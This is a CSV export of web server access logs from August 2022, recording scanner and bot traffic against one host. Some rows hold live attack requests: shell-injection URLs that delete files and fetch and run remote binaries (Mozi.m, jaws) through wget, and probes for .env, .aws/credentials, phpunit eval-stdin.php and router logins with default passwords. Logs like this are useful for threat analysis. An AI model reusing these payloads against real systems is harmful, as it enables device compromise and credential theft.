remote_host,ident,user,time_raw,time_iso,time_epoch,method,uri,protocol,status,bytes_sent,referer,user_agent
115.42.121.22,,,09/Aug/2022:19:38:33 -0500,2022-08-09T19:38:33-05:00,1660091913,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.180.143.6,,,09/Aug/2022:19:45:06 -0500,2022-08-09T19:45:06-05:00,1660092306,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
164.90.140.23,,,09/Aug/2022:19:55:03 -0500,2022-08-09T19:55:03-05:00,1660092903,GET,/,HTTP/1.1,301,232.0,,Linux Gnu (cow)
185.21.216.169,,,09/Aug/2022:20:04:15 -0500,2022-08-09T20:04:15-05:00,1660093455,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
107.155.50.6,,,09/Aug/2022:20:54:46 -0500,2022-08-09T20:54:46-05:00,1660096486,GET,/,HTTP/1.1,301,232.0,,curl/7.29.0
107.155.50.6,,,09/Aug/2022:20:54:47 -0500,2022-08-09T20:54:47-05:00,1660096487,\x16\x03\x01,,,400,226.0,,
209.222.252.91,,,09/Aug/2022:21:10:36 -0500,2022-08-09T21:10:36-05:00,1660097436,GET,/,HTTP/1.1,301,232.0,,Java/1.8.0_312
185.254.196.223,,,09/Aug/2022:21:26:02 -0500,2022-08-09T21:26:02-05:00,1660098362,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,09/Aug/2022:21:26:02 -0500,2022-08-09T21:26:02-05:00,1660098362,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.134.170,,,09/Aug/2022:21:26:17 -0500,2022-08-09T21:26:17-05:00,1660098377,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
186.251.229.2,,,09/Aug/2022:21:45:20 -0500,2022-08-09T21:45:20-05:00,1660099520,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
192.241.198.210,,,09/Aug/2022:21:54:52 -0500,2022-08-09T21:54:52-05:00,1660100092,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 zgrab/0.x
52.42.58.14,,,09/Aug/2022:22:28:35 -0500,2022-08-09T22:28:35-05:00,1660102115,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
52.36.255.255,,,09/Aug/2022:22:29:20 -0500,2022-08-09T22:29:20-05:00,1660102160,GET,/favicon.ico,HTTP/1.1,301,252.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
52.36.255.255,,,09/Aug/2022:22:29:23 -0500,2022-08-09T22:29:23-05:00,1660102163,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
36.93.119.71,,,09/Aug/2022:22:44:59 -0500,2022-08-09T22:44:59-05:00,1660103099,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.180.143.137,,,09/Aug/2022:23:19:26 -0500,2022-08-09T23:19:26-05:00,1660105166,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.196.220.70,,,09/Aug/2022:23:19:28 -0500,2022-08-09T23:19:28-05:00,1660105168,GET,/,HTTP/1.1,301,232.0,,Linux Gnu (cow)
180.149.125.165,,,09/Aug/2022:23:28:29 -0500,2022-08-09T23:28:29-05:00,1660105709,GET,/stalker_portal/server/tools/auth_simple.php,HTTP/1.1,301,275.0,,"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
2001:470:1:332::4,,,09/Aug/2022:23:36:24 -0500,2022-08-09T23:36:24-05:00,1660106184,GET,/,HTTP/1.1,400,226.0,,
154.89.5.82,,,10/Aug/2022:00:17:55 -0500,2022-08-10T00:17:55-05:00,1660108675,GET,/,HTTP/1.0,301,232.0,,
185.254.196.223,,,10/Aug/2022:00:25:34 -0500,2022-08-10T00:25:34-05:00,1660109134,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,10/Aug/2022:00:25:34 -0500,2022-08-10T00:25:34-05:00,1660109134,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
220.181.108.105,,,10/Aug/2022:01:09:01 -0500,2022-08-10T01:09:01-05:00,1660111741,GET,/,HTTP/1.1,301,241.0,,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
95.182.122.93,,,10/Aug/2022:01:16:01 -0500,2022-08-10T01:16:01-05:00,1660112161,GET,http://194.195.210.97:80/mysql/scripts/setup.php,HTTP/1.0,301,255.0,,
95.182.122.93,,,10/Aug/2022:01:16:01 -0500,2022-08-10T01:16:01-05:00,1660112161,GET,http://194.195.210.97:80/phpMyAdmin/scripts/setup.php,HTTP/1.0,301,260.0,,
198.20.69.98,,,10/Aug/2022:01:17:35 -0500,2022-08-10T01:17:35-05:00,1660112255,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
198.20.69.98,,,10/Aug/2022:01:17:35 -0500,2022-08-10T01:17:35-05:00,1660112255,GET,/robots.txt,HTTP/1.1,301,242.0,,
198.20.69.98,,,10/Aug/2022:01:17:36 -0500,2022-08-10T01:17:36-05:00,1660112256,GET,/sitemap.xml,HTTP/1.1,301,243.0,,
198.20.69.98,,,10/Aug/2022:01:17:37 -0500,2022-08-10T01:17:37-05:00,1660112257,GET,/.well-known/security.txt,HTTP/1.1,301,256.0,,
198.20.69.98,,,10/Aug/2022:01:17:39 -0500,2022-08-10T01:17:39-05:00,1660112259,GET,/favicon.ico,HTTP/1.1,301,243.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
31.7.58.162,,,10/Aug/2022:01:18:40 -0500,2022-08-10T01:18:40-05:00,1660112320,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
34.77.127.183,,,10/Aug/2022:01:18:49 -0500,2022-08-10T01:18:49-05:00,1660112329,GET,/,HTTP/1.1,301,232.0,,python-requests/2.28.1
192.241.213.80,,,10/Aug/2022:02:35:36 -0500,2022-08-10T02:35:36-05:00,1660116936,MGLNDD_194.195.210.97_80\n,,,400,226.0,,
172.105.77.209,,,10/Aug/2022:02:40:28 -0500,2022-08-10T02:40:28-05:00,1660117228,GET,/0bef,HTTP/1.0,301,237.0,,
185.254.196.223,,,10/Aug/2022:03:25:25 -0500,2022-08-10T03:25:25-05:00,1660119925,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,10/Aug/2022:03:25:25 -0500,2022-08-10T03:25:25-05:00,1660119925,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
88.212.1.28,,,10/Aug/2022:03:59:27 -0500,2022-08-10T03:59:27-05:00,1660121967,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.21.216.169,,,10/Aug/2022:04:01:42 -0500,2022-08-10T04:01:42-05:00,1660122102,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
151.245.3.146,,,10/Aug/2022:04:01:43 -0500,2022-08-10T04:01:43-05:00,1660122103,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
92.118.161.57,,,10/Aug/2022:04:28:57 -0500,2022-08-10T04:28:57-05:00,1660123737,GET,/,HTTP/1.0,301,233.0,,NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com
67.227.13.98,,,10/Aug/2022:04:48:17 -0500,2022-08-10T04:48:17-05:00,1660124897,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
101.35.224.108,,,10/Aug/2022:04:57:55 -0500,2022-08-10T04:57:55-05:00,1660125475,GET,http://194.195.210.97:80/mysql/scripts/setup.php,HTTP/1.0,301,255.0,,
101.35.224.108,,,10/Aug/2022:04:57:55 -0500,2022-08-10T04:57:55-05:00,1660125475,GET,http://194.195.210.97:80/phpMyAdmin/scripts/setup.php,HTTP/1.0,301,260.0,,
2620:96:e000:b0cc:e:2:2:5,,,10/Aug/2022:04:59:22 -0500,2022-08-10T04:59:22-05:00,1660125562,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
2620:96:e000:b0cc:e:2:2:5,,,10/Aug/2022:04:59:22 -0500,2022-08-10T04:59:22-05:00,1660125562,PRI,*,HTTP/2.0,400,226.0,,
107.182.129.137,,,10/Aug/2022:05:02:22 -0500,2022-08-10T05:02:22-05:00,1660125742,POST,/boaform/admin/formLogin,HTTP/1.1,301,255.0,http://194.195.210.97:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
182.180.101.122,,,10/Aug/2022:05:08:15 -0500,2022-08-10T05:08:15-05:00,1660126095,GET,/shell?cd+/tmp;rm+-rf+*;wget+synss.cf/jaws;sh+/tmp/jaws,HTTP/1.1,301,286.0,,"Hello, world"
185.196.220.70,,,10/Aug/2022:05:51:36 -0500,2022-08-10T05:51:36-05:00,1660128696,GET,/,HTTP/1.1,301,232.0,,Linux Gnu (cow)
185.254.196.223,,,10/Aug/2022:06:25:16 -0500,2022-08-10T06:25:16-05:00,1660130716,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,10/Aug/2022:06:25:16 -0500,2022-08-10T06:25:16-05:00,1660130716,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.60.149.21,,,10/Aug/2022:06:40:57 -0500,2022-08-10T06:40:57-05:00,1660131657,\x03,,,400,226.0,,
128.14.134.134,,,10/Aug/2022:06:54:23 -0500,2022-08-10T06:54:23-05:00,1660132463,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.14.134.134,,,10/Aug/2022:06:54:24 -0500,2022-08-10T06:54:24-05:00,1660132464,GET,/showLogin.cc,HTTP/1.1,301,244.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
167.94.145.58,,,10/Aug/2022:06:57:41 -0500,2022-08-10T06:57:41-05:00,1660132661,GET,/,HTTP/1.1,301,232.0,,
167.94.145.58,,,10/Aug/2022:06:57:41 -0500,2022-08-10T06:57:41-05:00,1660132661,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
167.94.145.58,,,10/Aug/2022:06:57:42 -0500,2022-08-10T06:57:42-05:00,1660132662,PRI,*,HTTP/2.0,400,226.0,,
144.202.36.16,,,10/Aug/2022:07:17:08 -0500,2022-08-10T07:17:08-05:00,1660133828,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
41.86.19.86,,,10/Aug/2022:07:51:52 -0500,2022-08-10T07:51:52-05:00,1660135912,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://41.86.19.86:45018/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,HTTP/1.0,301,405.0,,
221.15.85.11,,,10/Aug/2022:08:20:36 -0500,2022-08-10T08:20:36-05:00,1660137636,GET,/boaform/admin/formLogin?username=admin&psd=admin,HTTP/1.0,301,285.0,,
185.254.196.223,,,10/Aug/2022:09:25:22 -0500,2022-08-10T09:25:22-05:00,1660141522,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,10/Aug/2022:09:25:23 -0500,2022-08-10T09:25:23-05:00,1660141523,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.22,,,10/Aug/2022:09:30:09 -0500,2022-08-10T09:30:09-05:00,1660141809,GET,/,HTTP/1.1,301,232.0,,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
134.255.254.234,,,10/Aug/2022:09:32:24 -0500,2022-08-10T09:32:24-05:00,1660141944,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
134.255.254.234,,,10/Aug/2022:09:32:25 -0500,2022-08-10T09:32:25-05:00,1660141945,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
38.105.252.185,,,10/Aug/2022:10:26:11 -0500,2022-08-10T10:26:11-05:00,1660145171,GET,/shell?cd+/tmp;rm+-rf+*;wget+synss.cf/jaws;sh+/tmp/jaws,HTTP/1.1,301,286.0,,"Hello, world"
193.56.29.157,,,10/Aug/2022:10:47:33 -0500,2022-08-10T10:47:33-05:00,1660146453,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
194.165.16.78,,,10/Aug/2022:11:31:06 -0500,2022-08-10T11:31:06-05:00,1660149066,\x03,,,400,226.0,,
194.165.16.78,,,10/Aug/2022:11:31:06 -0500,2022-08-10T11:31:06-05:00,1660149066,\x03,,,400,226.0,,
74.82.47.3,,,10/Aug/2022:11:33:05 -0500,2022-08-10T11:33:05-05:00,1660149185,GET,/,HTTP/1.1,301,232.0,,
74.82.47.3,,,10/Aug/2022:11:34:56 -0500,2022-08-10T11:34:56-05:00,1660149296,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
194.163.132.194,,,10/Aug/2022:11:58:24 -0500,2022-08-10T11:58:24-05:00,1660150704,GET,/wp-login.php,HTTP/1.1,301,253.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96
157.245.215.216,,,10/Aug/2022:12:14:07 -0500,2022-08-10T12:14:07-05:00,1660151647,GET,/,HTTP/1.0,301,233.0,,Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
157.245.215.216,,,10/Aug/2022:12:15:07 -0500,2022-08-10T12:15:07-05:00,1660151707,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
185.21.216.169,,,10/Aug/2022:12:19:44 -0500,2022-08-10T12:19:44-05:00,1660151984,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
167.94.138.62,,,10/Aug/2022:12:21:18 -0500,2022-08-10T12:21:18-05:00,1660152078,GET,/,HTTP/1.1,301,232.0,,
167.94.138.62,,,10/Aug/2022:12:21:18 -0500,2022-08-10T12:21:18-05:00,1660152078,GET,/,HTTP/1.1,301,232.0,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
167.94.138.62,,,10/Aug/2022:12:21:18 -0500,2022-08-10T12:21:18-05:00,1660152078,PRI,*,HTTP/2.0,400,226.0,,
185.254.196.223,,,10/Aug/2022:12:25:44 -0500,2022-08-10T12:25:44-05:00,1660152344,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,10/Aug/2022:12:25:45 -0500,2022-08-10T12:25:45-05:00,1660152345,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.56.29.157,,,10/Aug/2022:12:27:49 -0500,2022-08-10T12:27:49-05:00,1660152469,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.157,,,10/Aug/2022:12:27:50 -0500,2022-08-10T12:27:50-05:00,1660152470,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.157,,,10/Aug/2022:12:27:51 -0500,2022-08-10T12:27:51-05:00,1660152471,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,HTTP/1.1,301,282.0,,python-requests/2.25.1
185.196.220.70,,,10/Aug/2022:12:28:27 -0500,2022-08-10T12:28:27-05:00,1660152507,GET,/,HTTP/1.1,301,232.0,,Linux Gnu (cow)
5.188.62.21,,,10/Aug/2022:13:40:29 -0500,2022-08-10T13:40:29-05:00,1660156829,GET,/,HTTP/1.1,301,241.0,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
128.14.209.162,,,10/Aug/2022:13:42:23 -0500,2022-08-10T13:42:23-05:00,1660156943,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
180.149.125.169,,,10/Aug/2022:13:43:34 -0500,2022-08-10T13:43:34-05:00,1660157014,GET,/c/,HTTP/1.1,301,234.0,,"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
103.145.85.49,,,10/Aug/2022:14:41:09 -0500,2022-08-10T14:41:09-05:00,1660160469,HEAD,/doc/page/login.asp,HTTP/1.1,301,,,curl/7.68.0
34.77.127.183,,,10/Aug/2022:15:03:36 -0500,2022-08-10T15:03:36-05:00,1660161816,GET,/,HTTP/1.1,301,232.0,,python-requests/2.28.1
185.254.196.223,,,10/Aug/2022:15:26:20 -0500,2022-08-10T15:26:20-05:00,1660163180,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,10/Aug/2022:15:26:21 -0500,2022-08-10T15:26:21-05:00,1660163181,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.129.187,,,10/Aug/2022:17:30:51 -0500,2022-08-10T17:30:51-05:00,1660170651,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.129.187,,,10/Aug/2022:17:30:51 -0500,2022-08-10T17:30:51-05:00,1660170651,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
91.191.209.182,,,10/Aug/2022:18:13:34 -0500,2022-08-10T18:13:34-05:00,1660173214,GET,/,HTTP/1.0,301,233.0,,masscan/1.3 (https://github.com/robertdavidgraham/masscan)
172.104.242.173,,,10/Aug/2022:18:18:32 -0500,2022-08-10T18:18:32-05:00,1660173512,\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159,X\xd4>\x12\x98\xc4<\xe0\x13\xcf,,400,226.0,,
66.249.66.79,,,10/Aug/2022:18:19:35 -0500,2022-08-10T18:19:35-05:00,1660173575,GET,/robots.txt,HTTP/1.1,301,242.0,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
66.249.66.81,,,10/Aug/2022:18:19:36 -0500,2022-08-10T18:19:36-05:00,1660173576,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
178.18.136.235,,,10/Aug/2022:18:21:57 -0500,2022-08-10T18:21:57-05:00,1660173717,GET,/wp-login.php,HTTP/1.1,301,253.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96
185.225.28.138,,,10/Aug/2022:18:22:32 -0500,2022-08-10T18:22:32-05:00,1660173752,GET,/,HTTP/1.1,301,232.0,,python-requests/2.27.1
185.254.196.223,,,10/Aug/2022:18:24:59 -0500,2022-08-10T18:24:59-05:00,1660173899,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,10/Aug/2022:18:25:00 -0500,2022-08-10T18:25:00-05:00,1660173900,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
88.214.18.45,,,10/Aug/2022:18:28:41 -0500,2022-08-10T18:28:41-05:00,1660174121,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
117.194.157.178,,,10/Aug/2022:20:31:41 -0500,2022-08-10T20:31:41-05:00,1660181501,GET,/boaform/admin/formLogin?username=adminisp&psd=adminisp,HTTP/1.0,301,291.0,,
185.21.216.169,,,10/Aug/2022:20:39:28 -0500,2022-08-10T20:39:28-05:00,1660181968,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
2001:470:1:c84::21,,,10/Aug/2022:21:20:27 -0500,2022-08-10T21:20:27-05:00,1660184427,GET,/,HTTP/1.1,400,226.0,,
185.254.196.223,,,10/Aug/2022:21:25:17 -0500,2022-08-10T21:25:17-05:00,1660184717,GET,/.env,HTTP/1.1,301,236.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223,,,10/Aug/2022:21:25:17 -0500,2022-08-10T21:25:17-05:00,1660184717,POST,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.131.66.209,,,10/Aug/2022:21:51:56 -0500,2022-08-10T21:51:56-05:00,1660186316,GET,/,HTTP/1.1,301,232.0,,curl/7.64.1
128.14.134.170,,,10/Aug/2022:22:05:07 -0500,2022-08-10T22:05:07-05:00,1660187107,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.55.120,,,10/Aug/2022:22:22:11 -0500,2022-08-10T22:22:11-05:00,1660188131,GET,/,HTTP/1.1,301,232.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
64.62.197.122,,,10/Aug/2022:22:28:16 -0500,2022-08-10T22:28:16-05:00,1660188496,GET,/,HTTP/1.1,301,232.0,,
179.43.155.171,,,10/Aug/2022:22:29:23 -0500,2022-08-10T22:29:23-05:00,1660188563,\x16\x03\x01,,,400,226.0,,
179.43.155.171,,,10/Aug/2022:22:29:24 -0500,2022-08-10T22:29:24-05:00,1660188564,GET,/.aws/credentials,HTTP/1.1,301,248.0,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
